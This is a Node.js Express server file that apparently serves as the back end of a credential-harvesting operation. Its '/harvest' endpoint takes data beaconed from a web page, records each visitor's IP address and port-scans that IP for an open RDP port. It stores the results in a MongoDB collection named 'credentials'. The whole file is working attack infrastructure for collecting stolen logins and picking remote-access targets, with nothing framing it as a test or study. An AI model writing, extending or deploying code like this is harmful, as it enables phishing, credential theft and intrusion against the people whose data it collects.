require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const { MongoClient } = require('mongodb');
const net = require('net'); // Import the net module

const app = express();
const port = 3003;

// Function to check if RDP port (3389) is open
async function checkRDPPort(ip) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(1000); // 1 second timeout

    socket.on('connect', () => {
      socket.destroy();
      resolve(true); // Port is open
    });

    socket.on('timeout', () => {
      socket.destroy();
      resolve(false); // Connection timed out
    });

    socket.on('error', (err) => {
      socket.destroy();
      resolve(false); // Error, port likely closed or unreachable
    });

    socket.connect(3389, ip);
  });
}

const mongoUrl = process.env.MONGODB_URI;
if (!mongoUrl) {
  console.error('MongoDB URI is not defined. Please check your .env file.');
  process.exit(1);
}
const client = new MongoClient(mongoUrl);

async function connectDb() {
  try {
    await client.connect();
    console.log('Connected to MongoDB');
  } catch (err) {
    console.error('Failed to connect to MongoDB', err);
    process.exit(1);
  }
}

app.use(bodyParser.json());
app.use(bodyParser.text({ type: '*/*' })); // Fallback for sendBeacon
app.use(express.static('.'));

app.post('/harvest', async (req, res) => {
  let data = req.body;
  console.log('Received data:', data);

  // If data is a string from sendBeacon, parse it
  if (typeof data === 'string') {
    try {
      data = JSON.parse(data);
    } catch (e) {
      console.error('Error parsing beacon data:', e);
      return res.status(400).send('Bad data format');
    }
  }
  
  // Capture client IP address
  const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  data.clientIp = clientIp;
  console.log('Client IP:', clientIp);

  // Check for open RDP port
  const isRdpOpen = await checkRDPPort(clientIp);
  data.rdpOpen = isRdpOpen;
  console.log(`RDP port 3389 on ${clientIp} is ${isRdpOpen ? 'open' : 'closed'}`);
  
  console.log('Harvested data with IP and RDP status:', data);

  try {
    const db = client.db();
    const collection = db.collection('credentials');
    await collection.insertOne(data);
    res.status(200).send('Data saved');
  } catch (err) {
    console.error('Error saving data to MongoDB:', err);
    res.status(500).send('Error saving data');
  }
});

app.listen(port, () => {
  console.log(`Server listening at http://localhost:${port}`);
  connectDb();
});